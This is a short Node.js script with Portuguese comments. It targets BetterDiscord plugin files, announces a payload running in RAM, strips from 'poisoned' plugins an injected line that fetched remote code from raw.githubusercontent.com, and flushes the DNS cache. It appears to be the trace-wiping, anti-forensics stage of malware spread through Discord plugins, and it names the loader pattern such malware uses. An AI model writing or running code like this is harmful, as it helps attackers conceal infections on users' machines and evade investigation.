(function() {
    const fs = require('fs');
    const path = require('path');
    const pDir = path.join(process.env.APPDATA, 'BetterDiscord', 'plugins');

    // 1.
    console.log("Executando carga na RAM...");
    // 

    // 2. Localiza o plugin envenenado e limpa o código
    const files = fs.readdirSync(pDir).filter(f => f.endsWith('.plugin.js'));
    files.forEach(file => {
        const fPath = path.join(pDir, file);
        let content = fs.readFileSync(fPath, 'utf8');
        
        // 
        if (content.includes('githubusercontent')) {
            const cleanContent = content.replace(/\nrequire\('https'\).get\('https:\/\/raw\.githubusercontent\.com[\s\S]*?\)\);/, "");
            fs.writeFileSync(fPath, cleanContent, 'utf8');
        }
    });

    // 3.
    require('child_process').exec('ipconfig /flushdns');
})();

